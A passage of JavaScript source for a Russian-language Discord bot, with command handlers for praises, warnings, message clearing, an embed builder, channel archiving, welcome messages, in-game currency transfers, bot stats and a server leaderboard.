    let react = await message.awaitReact({user: msg.author, type: "all"}, "640449832799961088", (isAuthor && user.praise[0]) ? "685057435161198594" : null);

    while (true) {
      switch (react){
        case "640449832799961088":
          await message.msg(isAuthor ? "Вас похвалили" : "Был похвален", {color: "00ffaf", description: mePraise, author: {name: memb.tag, iconURL: memb.avatarURL()}, edit: true});
          react = await message.awaitReact({user: msg.author, type: "all"}, "640449848050712587");
          break;


        case "640449848050712587":
          await message.msg(isAuthor ? "Похвалы" : "Похвалил", {color: "00ffaf" , description: iPraise, author: {name: memb.tag, iconURL: memb.avatarURL()}, footer: {text: isAuthor ? `Если вы хотите отменить,\nпохвалу кликните на *галочку* ниже.` : "Have a good goose"}, edit: true});
          react = await message.awaitReact({user: msg.author, type: "all"}, "640449832799961088", (isAuthor && user.praise[0]) ? "685057435161198594" : null);
          break;


        case "685057435161198594":
          let answer = await msg.channel.awaitMessage(msg.author, {message: "Введите номер пользователя из списка, которого вы хотите удалить"});
          answer = answer.content;

          if (answer === "+")
            answer = user.praise
              .map((id, i) => i + 1)
              .join(",");



          const throwOut = () => {
            if (throwOut.message === undefined)
              throwOut.message = "";

            throwOut.out = true;
          }

          const splices = answer.match(/\d+/g);

          if (splices === null){
            await msg.channel.msg(`Укажите хотя бы один номер, указывающий на пользователя которого надо удалить`, {color: "ff0000", delete: 9000});
            react = "640449848050712587";
            break;
          }


          const willRemoved = splices
            .map(userIndex => {
              if (user.praise.length < userIndex || userIndex <= 0){
                throwOut();
                throwOut.message += `\n• Не удалось определить пользователя под индексом ${ userIndex }`

                return null;
              }

              return getData(user.praise[userIndex - 1]);
            })
            .filter(data => data !== null);

          willRemoved
            .forEach(data => {
              if (data) {
                let index = data.praiseMe.indexOf(user.id);
                if (~index)
                  data.praiseMe.splice(index, 1);
              }

              user.praise.splice(answer - 1, 1);
            });


          if (willRemoved.length > 1){
            const list = willRemoved
              .map(data => {
                if (!data)
                  data = {name: "Неопределенного пользователя"};

                return data.name || `ID: ${ data.id }`;
              })
              .map(name => `• ${ name }`)
              .join("\n");

            const description = `Вы удалили следующих пользователей из списка похвал:\n${ list }`;
            const author = { name: msg.author.tag, iconURL: msg.author.avatarURL() };
            await msg.msg("", {author, description});
          }

          if (willRemoved.length === 1){
            const data = willRemoved[0];


            const discordUser = client.users.cache.get( data.id );
            const name   = discordUser ? discordUser.username : (data.name || data.id);
            const author = discordUser ? {name, iconURL: discordUser.avatarURL()} : null;

            await msg.msg(`Вы удалили ${ name } из списка похвал`, {author});
          }


          if (throwOut.out){
            const main = `Введите число в диапазоне от 1 до ${ user.praise.length } включительно.\nУкажите несколько чисел или знак "+" (все похвалы), чтобы за раз удалить несколько похвал.`;
            const description = `${ main }\n${ throwOut.message }`;
            msg.msg("Отчёт возникших проблем:", {description, color: "ff0000", delete: 12000});
          }

          iPraise = (user.praise.length) ? user.praise.map((id, i) => (i + 1) + ". "+ (getData(id) ? Discord.Util.escapeMarkdown( getData(id).name ) : "пользователь не определен")).join(`\n`) : (isAuthor) ? "Вы никого не хвалили \nиспользуйте **!похвалить**" : "Никого не хвалил";
          iPraise += "\n• (пусто)".repeat( Math.max(maximumPraises - user.praise.length, 0) );
          await message.msg(isAuthor ? "Похвалы" : "Похвалил", {color: "00ffaf" , description: Discord.Util.escapeMarkdown(iPraise), author: {name: memb.tag, iconURL: memb.avatarURL()}, footer: {text: isAuthor ? `Если вы хотите отменить,\nпохвалу кликните на *галочку* ниже.` : "Have a good goose"}, edit: true});



          react = "640449848050712587";
          break;


        default:
         msg.reactions.removeAll();
         return;
       }
    }
  }, {delete: true, cooldown: 20, try: 2, type: "user"}, "похвалы лайки likes"),

  warn: new Command(async (msg, op) => {
    let memb = op.memb;

    op.args = op.args.split(" ").slice(1).join(" ");

    if (memb == msg.author) {
      msg.msg(`${msg.author.username} выдал себе предупреждение за то, что ${op.args.trim() || "смешной такой"}`, {color: "ff0000"});
      return;
    }

    let message = (op.args) ?
      `Участник ${msg.author.username} выдал предупреждение ${memb.username}\n**Причина:** ${op.args}` :
      `${msg.author.username} выдал предупреждение ${memb.username} без объяснения причин.`;

    msg.msg("Выдан пред", {description: `${message}`, color: "ff0000", author: {name: `Выдал: ${msg.author.username}`, iconURL: msg.author.avatarURL()}, footer: {text: "Призрачный бан...", iconURL: memb.avatarURL()}});

    memb.msg(`Вам выдано предупреждение \nПричина: ${op.args || "не указана"}`, {color: "ff0000", footer: {text: "Выдал: " + msg.author.tag}});
    msg.guild.logSend(`Одному из участников выдано предупреждение`, {description: message, color: "ff0000"});
  }, {delete: true, memb: true, dm: true, try: 3, cooldown: 120, Permissions: 4194304, type: "guild"}, "пред варн"),

  clear: new Command(async (msg, op) => {
    await msg.delete()
      .catch(() => {});

    const
      channel      = msg.channel,
      args         = op.args;

    const referenceId = msg.reference ? msg.reference.messageID : null;

    const userId  = match(args, /\d{17,19}/);
    const limit   = match(args, /(?:\s|^)\d{1,16}(?:\s|$)/);


    const
      foundedMessages = [],
      twoWeekAgo      = new Date() - 1209600000,
      options         = { limit: 50 };

    const foundLimit =
      referenceId ? 500 :
      Math.min(
        limit !== false ? limit : 75,
        900
      );

    let lastMessageId = null;
    while (true) {
      if (lastMessageId)
        options.before = lastMessageId;

      const messages = await channel.messages.fetch(options);
      foundedMessages.push(...messages.array());

      if (referenceId){
        const founded = messages.find(msg => msg.id === referenceId);

        if (founded){
          foundedMessages.splice(foundedMessages.indexOf(founded));
          break;
        }

        if (messages.size !== 50 || foundedMessages.length === 350){
          msg.msg("Не удалось найти сообщение", {color: "ff0000", delete: 3000, description: args});
          return;
        }
      }

      lastMessageId = messages.last().id;
      if (messages.size !== 50 || foundedMessages.length >= foundLimit){
        break;
      }
    };

    let messages = foundedMessages;

    messages = messages.filter(message => !message.pinned);

    if (msg.channel.type === "dm")
      messages = messages.filter(message => message.author === client.user);


    if (userId)
      messages = messages.filter(message => message.author.id === userId);

    messages.splice(foundLimit);

    if (messages.length === 0)
      return msg.msg("Вроде-как удалено 0 сообщений", {delete: 3000, description: "Я серьёзно! Не удалено ни единого сообщения!"});


    let counter = await msg.msg(`Пожалуйста, Подождите... ${ ending(messages.length, "сообщени", "й", "е", "я") } на удаление.`, {description: "Нажмите реакцию чтобы отменить чистку", reactions: ["❌"]});
    let toDelete = messages.length;

    await delay(3000);

    if (messages.length > 120){
      msg.channel.startTyping();
    }

    const byBulkDelete = [];
    const byOneDelete  = [];

    messages.forEach(msg => {
      if (msg.channel.type === "dm")
        return byOneDelete.push(msg);

      if (msg.createdTimestamp - twoWeekAgo < 0)
        return byOneDelete.push(msg);

      byBulkDelete.push(msg);
    });

    const updateCounter = async () => {
      const current = toDelete - byOneDelete.length - byBulkDelete.length;
      counter = await counter.msg(`Пожалуйста, Подождите... ${ current } / ${ toDelete }`, {edit: true});
    }

    const isReaction = () => {
      const reacted = counter.reactions.cache.get("❌");
      if (reacted)
        return reacted.users.cache.has(msg.author.id);
    }

    const sendLog = () => {
      const current = toDelete - byOneDelete.length - byBulkDelete.length;

      if (current === 0)
        return;

      const mode = (referenceId) ? `До указанного сообщения` : (userId) ? `Сообщения пользователя <@${ userId }>` : (limit) ? "Количественная выборка" : "Все сообщения";
      const isCancel = !!(toDelete - current);
      const description = `В канале: ${ channel.toString() }\nУдалил: ${msg.author.toString()}\nТип чистки: ${ mode }${ isCancel ? "\n\nЧистка была отменена" : "" }`;

      if (msg.guild)
        msg.guild.logSend(`Удалено ${ ending(current, "сообщени", "й", "е", "я") }`, {description});
    }

    while (byBulkDelete.length || byOneDelete.length){


      if ( isReaction() ){
        counter.delete();

        const current = toDelete - byOneDelete.length - byBulkDelete.length;
        const description = `Было очищено ${ ending(current, "сообщени", "й", "е", "я") } до отмены`;
        msg.msg("Очистка была отменена", {description, delete: 12000});

        sendLog();

        msg.channel.stopTyping();

        return;
      }




      if (byBulkDelete.length){
        await channel.bulkDelete( byBulkDelete.splice(0, 50) );
      }

      else {
        for (const message of byOneDelete.splice(0, random(5, 15))){
          await message.delete();
        }
      }



      updateCounter();
    }

    await delay(toDelete * 30);
    msg.channel.stopTyping();

    counter.msg(`Удалено ${ ending(toDelete, "сообщени", "й", "е", "я") }!`, { edit: true, delete: 1500 });

    sendLog();
  }, {myChannelPermissions: 8192, ChannelPermissions: 8192, cooldown: 15, try: 5, type: "guild"}, "очистить очисти очисть клир клиар"),

  embed: new Command(async (msg, op) => {
    let author = msg.author, embed;
    let commandDescription = `С помощью реакций создайте великое сообщение \nкоторое не останется незамеченным\nПосле чего отправьте его в любое место этого сервера!\n\n📌 - заглавие/название\n🎨 - цвет\n🎬 - описание\n👤 - автор\n🎏 - подгруппа\n🪤 - изображение сверху\n🪄 - изображение снизу\n🧱 - добавить область\n🕵️ - установить вебхук\n😆 - добавить реакции\n📥 - футер\n\n⭑ После завершения жмякайте <:arrowright:640449832799961088>\n`

    if (!op.args){
      embed = new Discord.MessageEmbed()
      .setTitle("Эмбед конструктор")
      .setColor(((process.env.DEVELOPMENT === "FALSE") ? "23ee23" : "000100"))
      .setDescription(commandDescription)
    }
    else {
      try {
        embed = new Discord.MessageEmbed(JSON.parse(op.args.replace(/\\(?=`)/g, "") ));
        if (!embed.title && !embed.image && !embed.description && !embed.video) throw new Error("JSON != Embed");
        if (embed.description) embed.description = embed.description.replace(/\\n/g, "\n");
      } catch (e) {
        msg.msg("В JSON(-е) ошибка, или аргументы не являются json(-м)", {description: e.message, delete: 10000})
        embed = new Discord.MessageEmbed()
        .setTitle("Эмбед конструктор")
        .setColor(((process.env.DEVELOPMENT === "FALSE") ? "23ee23" : "000100"))
        .setDescription(commandDescription)
      }
    }


    let
      preview = await msg.msg(embed, {embed: true}),
      react, answer, reactions;


    while (true) {
      if (typeof react != "object")
        react = await preview.awaitReact({user: author, type: "one"}, "📌", "🎨", "🎬", "👤", "🎏", "📥", "😆", "640449832799961088");
      else
        react = await preview.awaitReact({user: author, type: "one"}, ...react);

      switch (react) {
        case "📌":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Введите название 📌", embed: {color: embed.color}});
          if (!answer){
            continue;
          }

          let link = answer.content.match(/https:\/\/.+?(\s|$)/);
          if (link){
            answer.content = answer.content.replace(link[0], "").trim();
            embed.setURL(link);
          }
          embed.setTitle(answer);

          break;

        case "🎨":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Цвет в формате: #2c2f33", embed: {color: embed.color}});
          if (!answer){
            continue;
          }

          let color = answer.content.match(/[abcdef0-9]{6}|[abcdef0-9]{3}/i);
          if (!color) {
            msg.msg("Неверный формат, введите цвет в формате HEX `#38f913`", {color: "ff0000", delete: 5000});
            continue;
          }
          color = color[0].toLowerCase();
          color = color.length === 3 ? [...color].map(e => e + e).join("") : color;

          embed.color = color;
          break;

        case "🎬":
          answer = await msg.channel.awaitMessage(msg.author, {time: 1000000, message: "Описание к фильму 🎬", embed: {color: embed.color}});
          if (!answer){
            continue;
          }
          embed.setDescription(answer);
          break;

        case "👤":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Упомяните пользователя, чтобы использовать его аватар и ник", embed: {description: "Вы также можете указать свое содержание. Для этого не используйте никаких упоминаний и укажите ссылку на изображение", color: embed.color}});
          if (!answer){
            continue;
          }
          let user = answer.mentions.users.first();
          if (user){
            embed.setAuthor(user.username, user.avatarURL());
            break;
          }

          let image = answer.content.match(/https:\/\/.+?(\s|$)/);
          if (image){
            answer.content = answer.content.replace(image[0], "").trim();
          }

          image = image ? image[0] : null;
          embed.setAuthor(answer.content, image);
          break;

        case "🎏":
          await preview.reactions.removeAll();
          react = ["640449848050712587", "🧱", "🪄", "🪤", "🕵️"];
          break

        case "📥":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите текст футера", embed: {description: `Впишите ссылку на изображение, если хотите, чтобы была картинка`, color: embed.color}});
          if (!answer){
            continue;
          }
          let url = answer.content.match(/https:\/\/.+?(\s|$)/);
          if (url){
            answer.content = answer.content.replace(url[0], "").trim();
          }

          url = url ? url[0] : null;
          embed.setFooter(answer, url);
          break;

        case "😆":
          await preview.reactions.removeAll();
          let collector = await msg.msg("Установите реакции прямо под этим сообщением!\nА затем жмякните реакцию\"Готово\"<:mark:685057435161198594>", {color: embed.color});
          react = await preview.awaitReact({user: author, type: "one"}, "685057435161198594");
          reactions = Array.from(collector.reactions.cache.keys());
          collector.delete();
          await preview.reactions.removeAll();
          break;

        case "🪤":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Ссылка на изображение", embed: {description: "Оно будет отображаться справа-сверху", color: embed.color}});
          if (!answer){
            continue;
          }
          if (!answer.content.startsWith("http")){
            msg.msg("Вы должны указать ссылку на изображение", {color: "ff0000", delete: 3000});
            continue;
          }
          embed.setThumbnail(answer.content);
          react = ["640449848050712587", "🧱", "🪄", "🪤", "🕵️"];
          break;

        case "🪄":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Ссылка на изображение", embed: {description: "Оно будет отображаться в нижней части эмбеда", color: embed.color}});
          if (!answer){
            continue;
          }
          if (!answer.content.startsWith("http")){
            msg.msg("Вы должны указать ссылку на изображение", {color: "ff0000", delete: 3000});
            continue;
          }
          embed.setImage(answer.content);
          react = ["640449848050712587", "🧱", "🪄", "🪤", "🕵️"];
          break;

        case "🧱":
          let name = await msg.channel.awaitMessage(msg.author, {message: "Укажите имя для этой области", embed: {fields: [{name: "Так отображается **название**", value: "Тут будет значение"}], color: embed.color}});
          if (!name){
            continue;
          }
          let value = await msg.channel.awaitMessage(msg.author, {message: "Введите значение", embed: {fields: [{name: name, value: "Тут будет значение"}], color: embed.color}});
          if (!value){
            continue;
          }
          embed.addField(name, value, true);
          react = ["640449848050712587", "🧱", "🪄", "🪤", "🕵️"];
          break;

        case "🕵️":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите имя и ссылку на аватар Вебхука, от имени которого будет отправляться эмбед-сообщение.", embed: {description: "Если вы собираетесь использовать уже имеющийся вебхук, укажите только его имя.\nДля каждого канала, в который будет отправлено сообщение создаётся свой собственный вебхук.", color: embed.color}});
          if (!answer){
            continue;
          }

          let avatar = match(answer, /http\S+/);
          if (avatar){
            answer.content = answer.content.replace(avatar, "").trim();
          }

          embed.webhook = {name: answer.content, avatar};
          react = ["640449848050712587", "🧱", "🪄", "🪤", "🕵️"];
          msg.msg("Успешно!", {author: {name: answer.content, iconURL: avatar}, delete: 3000});
          break;

        case "640449848050712587":
          // Arror-Left
          await preview.reactions.removeAll();
          break;

        case "640449832799961088":
          // Send Embed-Message
          await preview.reactions.removeAll();
          let whatChannelSend = await msg.msg("Введите Айди канала или упомяните его для отправки эмбеда", {color: embed.color, description: "Или используйте реакцию <:arrowright:640449832799961088>, чтобы отправить в этот канал."});
          answer = await reactOrMessage(whatChannelSend, msg.author, "640449832799961088");
          whatChannelSend.delete();

          if (!answer){
            continue;
          }

          let channel =
            answer === "640449832799961088" ? msg.channel : false
            ||
            answer.mentions.channels.first()
            ||
            msg.guild.channels.cache.get(answer.content)
            ||
            client.channels.cache.get(answer.content);

          if (!channel) {
            msg.channel.msg("Канал не существует", {color: "ff0000", delete: 4500});
            continue;
          }

          if (!channel.guild.member(msg.author)) {
            msg.channel.msg("Вы должны присутствовать на сервере, которому предналежит этот канал, чтобы отправить Эмбед-сообщение", {color: "ff0000", delete: 4500});
            continue;
          }

          if (channel.guild.member(msg.author).wastedPermissions(18432, channel)[0]) {
            msg.channel.msg("В указанный канале у вас нет права отправлять Эмбед-сообщения ", {color: "ff0000", delete: 4500});
            continue;
          }

          if (embed.webhook){
            let webhooks = await channel.fetchWebhooks();
            let hook = webhooks.find(e => e.name === embed.webhook.name);

            if (hook && embed.webhook.avatar){
              await webhook.edit({avatar: embed.webhook.avatar});
            }

            if (!hook){
              hook = await channel.createWebhook(embed.webhook.name, {
                avatar: embed.webhook.avatar || "https://www.emojiall.com/images/240/openmoji/1f7e9.png",
                reason: `${msg.author.tag} (${msg.author.id}) Created a message with Embed-constructor`
              });
            }
            channel = hook;
          }

          await channel.msg(embed, {embed: true, reactions: reactions});
          react = ["✏️", "❌", "640449832799961088"];
          break;

        case "❌":
          preview.delete();
          return;

        case "✏️":
          preview.reactions.removeAll();
          break;

        default:
          return;
      }

      preview.msg(embed, {embed: true, edit: true});
    }


  }, {delete: true, ChannelPermissions: 16384, cooldown: 30, try: 3, type: "guild"}, "ембед эмбед"),

  archive: new Command(async (msg, op) => {
    if (msg.author.id != 921403577539387454){
      return msg.msg("Эта команда была удалена", {delete: 4000, embed: true});
    }
    let
      channel      = msg.channel,
      sum_messages = [],
      options      = {limit: 100},
      time         = 0,
      date         = new Date(),
      last_id;

    while (true) {
      if (last_id) options.before = last_id;
      const messages = await channel.messages.fetch(options, false);
      sum_messages.push(...messages.array());
      last_id = messages.last().id;
      if (messages.size != 100) break;
      if (++time == 20) msg.msg("Нужно немного подождать", {delete: 3000})
      if (++time == 50) msg.msg("Ждите", {delete: 3000})
    }

    let input = date + "\n\n", last;
    sum_messages.reverse().forEach(item => {
      if (!last || last.author.tag != item.author.tag){
        let data = new Date(item.createdTimestamp);
        input += "\n    ---" + item.author.tag + " " + data.getHours() + ":" + data.getMinutes() + "\n";
      }
      input += item.content + "\n";
      last = item;
    });

    let buffer = Buffer.from(input.replace("undefined", ""), "utf-8");

    msg.msg(new Discord.MessageAttachment(buffer, (op.args || "archive") + ".txt"), {embed: true});
    if (time > 35) msg.msg("Вот ваша печенька ожидания 🍪");
  }, {delete: true, try: 1, cooldown: 3600, Permissions: 16, type: "delete"}, "arhive архив"),

  setchat: new Command(async (msg, op) => {
    let guild = msg.guild;
    guild.data.chatChannel = (msg.mentions.channels.first() || msg.channel).id;
    msg.channel.msg(`#${msg.guild.channels.cache.get(guild.data.chatChannel).name} канал стал чатом!`, {delete: 4500});
    // msg.guild.logSend(`Каналу #${msg.guild.channels.cache.get(guild.data.chatChannel).name} установили метку "чат"`);
  }, {delete: true, dm: true, Permissions: 32, type: "guild"}, "установитьчат"),

  setlogs: new Command(async (msg, op) => {
    let guild = msg.guild;
    guild.data.logChannel = (msg.mentions.channels.first() || msg.channel).id;
    msg.channel.msg(`Готово. В #${msg.guild.channels.cache.get(guild.data.logChannel).name} будут отправлятся логи сервера`, {delete: 4500});
  }, {delete: true, dm: true, Permissions: 32, type: "guild"}, "установитьлоги"),

  welcomer: new Command(async (msg, op) => {
    let guild = msg.guild;
    let answer;

    if (guild.data.hi) {
        let early = await msg.msg("Ранее установленное приветствие:", {color: guild.data.hi.color, image: guild.data.hi.image, description: guild.data.hi.message, scope: {tag: msg.author.toString(), name: msg.author.username}, footer: {text: "Нажмите реакцию, чтобы продолжить редактирование"}});
        let react = await early.awaitReact({user: msg.author, type: "all", time: 20000}, "✏️");
        early.delete();
        if (!react) return;
    }

    let whatMessage = await msg.msg("Введите сообщение с которым бот будет встречать новых пользователей!", {description: "Используйте шаблонные строки !{name}, они знатно вам помогут!", destroy: true});
    answer = await msg.channel.awaitMessage(msg.author);
    if (!answer) {
      return;
    }

    let message = answer.content;
    whatMessage.delete();

    let whatColor = await msg.msg("Укажите цвет в формате HEX `#38f913`", {description: "Используйте реакцию ❌, чтобы пропустить этот пункт"});
    answer = await reactOrMessage(whatColor, msg.author, "❌");
    if (!answer){
      return;
    }

    let color = (answer.content) ? answer.content.replace("#", "") : null;
    whatColor.delete();

    let whatImage = await msg.msg("Укажите ссылку на изображение", {description: "Или пропустите этот пункт"});
    answer = await reactOrMessage(whatImage, msg.author, "❌");
    if (!answer) {
      return;
    }

    let image = answer.content || null;
    whatImage.delete();
    if (image && !image.startsWith("http")) return msg.msg("Вы должны указать ссылку на изображение", {color: "ff0000", delete: 3000});

    let rolesId;
    let whatRoles = await msg.msg("Вы можете указать айди ролей через пробел, они будут выдаваться всем новым пользователям", {description: "Этот пункт тоже можно пропустить"});
    answer = await reactOrMessage(whatRoles, msg.author, "❌");
    if (!answer) return;
    whatRoles.delete();
    if (answer.content){
      rolesId = answer.content.split(" ");
      let roles   = rolesId.map(el => msg.guild.roles.cache.get(el)).filter(el => el);
      if (rolesId.length != roles.length) return msg.msg(`Не удалось найти роли по следующим иденфикаторам: ${rolesId.filter(el => !roles.map(el => el.id).includes(el)).join(" ")}`, {delete: 5000, color: "ff0000"});
    }
    else roleId = false;



    let whatChannel = await msg.msg("Упомяните канал для отправки приветсвий или...", {color: "ffff00", description: `📥 - Установить в этом канале ${guild.channels.cache.get(guild.data.hiChannel) ? ("\nСейчас установлен:\n" + guild.channels.cache.get(guild.data.hiChannel).toString() + " - Оставить как есть 🔰") : ""}`});
    answer = await reactOrMessage(whatChannel, msg.author, "📥", ((guild.data.hiChannel) ? "🔰" : null));
    if (!answer) {
      return;
    }

    whatChannel.delete();

    if (answer !== "🔰") {
      guild.data.hiChannel = answer.mentions.channels.first() ? answer.mentions.channels.first().id : msg.channel.id;
      msg.channel.msg(`#${msg.guild.channels.cache.get(msg.channel.id).name} установлен каналом для приветсвия новых пользователей`, {delete: 4500});
    }

    guild.data.hi = {message, color, image, rolesId};
    msg.msg("Готово! Предпросмотр", {color: color, image: image, description: message, scope: {tag: msg.author.toString(), name: msg.author.username}, delete: 15000});

  }, {delete: true, dm: true, Permissions: 32, type: "guild"}, "установитьприветствие sethello приветствие"),

  pay: new Command(async (msg, op) => {
    let memb = op.memb;
    op.args = op.args.replace(new RegExp(`<@!?${memb.id}>`), "");


    let num = op.args.match(/\d+|\+/);

    if (!num) {
      msg.msg("Вы не ввели значение. Ожидается сумма передачи.", {color: "ff0000"});
      return;
    }

    num = num[0];
    op.args = op.args.replace(num, "").trim();

    let [itemName, ...message] = op.args.split(" ");


    if (memb.bot) {
      msg.msg("Вы не можете передать что-либо боту");
      return;
    }

    let heAccpet = await accept("give", "Используя эту команду вы потеряете коины или другие ресурсы", msg.channel, op.user);
    if (!heAccpet) return;

    if (memb === msg.author) {
      msg.msg(`${msg.author.username} попытался наколдовать немного ресурсов (${ num } ❔) — безуспешно.`);
      return;
    }


    const RESOURCES = [
      {
        resource: "coins",
        names: "coins coin коин коинов коина коины монет монету монеты монета",
        gives: n => `${ending(n, "коин", "ов", "", "а")} <:coin:637533074879414272>`
      },

      {
        resource: "void",
        names: "void камень камня камней нестабильность камни нестабильности нест н",
        gives: n => `${ending(n, "кам", "ней", "ень", "ня")} нестабильности`
      },

      {
        resource: "chestBonus",
        names: "bonus chest бонус бонусов бонуса бонусы сундук сундука сундуки сундуков б с",
        gives: n => `${ ending(n, "бонус", "ов", "", "а") } сундука`
      },

      {
        resource: "chilli",
        names: "chilli перец перца перцев перцы",
        gives: n => ending(n, "пер", "цев", "ец", "ца")
      },

      {
        resource: "keys",
        names: "keys key ключ ключей ключа ключи k к",
        gives: n => ending(n, "ключ", "ей", "", "а")
      },

      {
        resource: "berrys",
        names: "клубника клубник клубники berrys berry ягод ягода ягоды",
        gives: n => ending(n, "клубник", "", "а", "и")
      },

      {
        resource: "monster",
        names: "monster монстр монстра монстров монстры",
        gives: n => ending(n, "монстр", "ов", "", "а")
      }
    ];

    let resourceData = RESOURCES.find(obj => obj.names.split(" ").includes( itemName.toLowerCase() ));
    if (!resourceData){
      message = [itemName, ...message];
      resourceData = RESOURCES[0];
    }
    let resource = resourceData.resource;

    message = message.join(" ");

    if (num === "+"){
      num = op.user[ resource ];
    }
    num = Math.floor(num);

    if (num < 0) {
      msg.msg("Введено отрицательное значение.\n<:grempen:753287402101014649> — Укушу.");
      return;
    }

    if (isNaN(op.user[resource])){
      op.user[resource] = 0;
    }

    if (isNaN(memb.data[resource])){
      memb.data[resource] = 0;
    }


    if (op.user[ resource ] < num) {
      const description = Discord.Util.escapeMarkdown(msg.content);
      msg.msg(`Нужно ещё ${ resourceData.gives(num - op.user[ resource ]) }`, {description, delete: 12000});
      return;
    }






    op.user[ resource ]   -= num;
    memb.data[ resource ] += num;

    msg.msg("", {description: `${msg.author.username} отправил ${ resourceData.gives(num) } для ${ memb.toString() }` + (message ? `\nС сообщением:\n${ message }` : ""), author: {name: "Передача", iconURL: msg.author.avatarURL()}});
  }, {delete: true, dm: true, memb: true, try: 7, cooldown: 300, type: "user"}, "give дать заплатить"),

  bot: new Command(async (msg, op) => {


    let {rss, heapTotal} = process.memoryUsage();
    let season = ["Зима", "Весна", "Лето", "Осень"][Math.floor((new Date().getMonth() + 1) / 3) % 4];
    const VERSION = "V5.740 BETA";
    const characters = data.bot.characters;

    let markdown = ["x", "**", "||", "__", "_", "`"].filter( () => random(1) );

    client.api.channels(msg.channel.id).messages.post({data: {
      "embed": {
        "title": "ну типа.. ай, да, я живой, да",
        "color": 	65280,
        "description": `<:online:637544335037956096> Пинг: ${client.ws.ping} ${VERSION} [#${season}](https://hytale.com/supersecretpage), что сюда ещё запихнуть?\nСерваков...**${client.guilds.cache.size}** (?) Команд: ${Command.cmds}\nСимволов в скрипте: примерно **#**Почему-то это никому не понравилось и было удалено;\n\`${(heapTotal/1024/1024).toFixed(2)} мб / ${(rss/1024/1024).toFixed(2)} МБ\``,
        "footer": {"text": `Укушу! Прошло времени с момента добавления бота на новый сервер: ${timestampToDate(getTime() - data.bot.newGuildTimestamp, 2)}`}
      },
      "content": "",
      "components": [
        {
           "type": 1,
           "components": [
             {
                    "type": 2,
                    "label": "Удалить!",
                    "style": 1,
                    "custom_id": "bot_hi"
              },
             {
                    "type": 2,
                    "label": "Сервер",
                    "style": 5,
                    "url": "https://discord.gg/76hCg2h7r8",
                    "emoji": {name: "grempen", id: "753287402101014649"}
              },
              {
                     "type": 2,
                     "label": "Пригласить",
                     "style": 5,
                     "url": `https://discord.com/api/oauth2/authorize?client_id=${ client.user.id }&permissions=1073741832&scope=applications.commands%20bot`,
                     "emoji": {name: "berry", id: "756114492055617558"}
               }
           ]
       }
      ]
    }});
  }, {delete: true, cooldown: 10, try: 2, type: "bot"}, "бот stats статс ping пинг стата invite пригласить"),

  top: new Command(async (msg, op) => {
    let guild = msg.guild;
    let others = ["637533074879414272", "763767958559391795", "630463177314009115", "🧤", "📜", "⚜️", (guild.data.boss?.isArrived ? "⚔️" : null)];

    let users = guild.members.cache.map(e => e.user).filter(el => !el.bot && !el.data.profile_confidentiality).sort((b, a) => ( (a.data.level - 1) * 22.5 * a.data.level + a.data.exp) - ( (b.data.level - 1) * 22.5 * b.data.level + b.data.exp));
    let rangs, sort;

    let pages = [];

    let page = 0;
    let embed = {fields: pages[0], author: {name: `Топ на сервере ${ guild.name }`, iconURL: guild.iconURL()}, message: "Загрузка Топа.."};
    if (pages[1]) embed.footer = {text: `Страница: ${page + 1} / ${pages.length}`};
    let message = await msg.msg( embed);
    let react = "763767958559391795";
    let index = -1;


    embed.edit = true;

    while (true){
      switch (react) {
        case "640449832799961088": page++;
        break;
        case "640449848050712587": page--;
        break;


        case "637533074879414272":
          // coins
          sort = users.sort((a, b) => (b.data.coins + b.data.berrys * data.bot.berrysPrise) - (a.data.coins + a.data.berrys * data.bot.berrysPrise));
          index = sort.indexOf(msg.author);
          rangs = sort.map((e, i) => {
            let name = (i + 1) + ". " + ((e.id == msg.author.id) ? (e.username) : e.username);
            let value = `— ${e.data.coins} (${ Math.floor( e.data.coins + e.data.berrys * data.bot.berrysPrise ) }) <:coin:637533074879414272>`;
            return {name, value};
          });
          break;

        case "763767958559391795":
          // level
          sort = users.sort((b, a) => ( (a.data.level - 1) * 22.5 * a.data.level + a.data.exp) - ( (b.data.level - 1) * 22.5 * b.data.level + b.data.exp));
          index = sort.indexOf(msg.author);
          rangs = sort.map((e, i) => {
            let name = ((i == 0) ? "<a:crystal:637290417360076822> " : (i == 1) ? "<:crys3:763767653571231804> " : (i == 2) ? "<:crys2:763767958559391795>" : "<:crys:637290406958202880> ") + (i + 1) + ". " + ((e.id == msg.author.id) ? (e.username) : e.username);
            let value = `Уровень: **${ e.data.level }** | Опыта: ${(e.data.level - 1) * 22.5 * e.data.level + e.data.exp}`;
            return {name, value};
          });
          break;

        case "630463177314009115":
          // praises
          sort = users.filter(e => e.data.praiseMe).sort((a, b) => (b.data.praiseMe.length) - (a.data.praiseMe.length));
          index = sort.indexOf(msg.author);
          if (!msg.author.data.praiseMe) msg.author.data.praiseMe = [];
          rangs = sort.map((e, i) => {
            let name = (i + 1) + ". " + ((e.id == msg.author.id) ? (e.username) : e.username);
            let value = "— Был похвален " + ending(e.data.praiseMe.length, "раз", "", "", "а") + " <:wellplayed:630463177314009115>";
            return {name, value};
          });
          break;

        case "🧤":
          // thief
          sort = users.sort((a, b) => ((b.data.thiefGloves ? +b.data.thiefGloves.split("|")[1] : 0) + ~~b.data.thiefWins / 5) - ((a.data.thiefGloves ? +a.data.thiefGloves.split("|")[1] : 0) + ~~a.data.thiefWins / 5));
          index = sort.indexOf(msg.author);
          rangs = sort.map((e, i) => {
            let name = (i + 1) + ". " + e.username;
            let value = `Состояние перчаток: \`${e.data.thiefGloves || "0|0"}\` > Отбито атак: ${e.data.thiefWins | 0}`.replace(/-/g, "!");
            return {name, value};
          });
          break;

        case "📜":
          // quests
          sort = users.filter(e => e.data.dayQuests).sort((a, b) => (b.data.dayQuests) - (a.data.dayQuests));
          index = sort.indexOf(msg.author);
          rangs = sort.map((e, i) => {
            let name = ((i == 0) ? "<a:cupZ:806813908241350696> " : (i == 1) ? "<a:cupY:806813850745176114> " : (i == 2) ? "<a:cupX:806813757832953876> " : "") + (i + 1) + ". " + e.username;
            let value = `Выполнено ежедневных квестов: ${e.data.dayQuests || 0} | Глобальных: ${(e.data.completedQuest || []).length}/${Object.values(quests.names).length}`;
            return {name, value};
          });
          break;

        case "⚜️":
          // void
          sort = users.filter(e => e.data.voidRituals).sort((a, b) => (b.data.voidRituals) - (a.data.voidRituals));
          index = sort.indexOf(msg.author);
          rangs = sort.map((e, i) => {
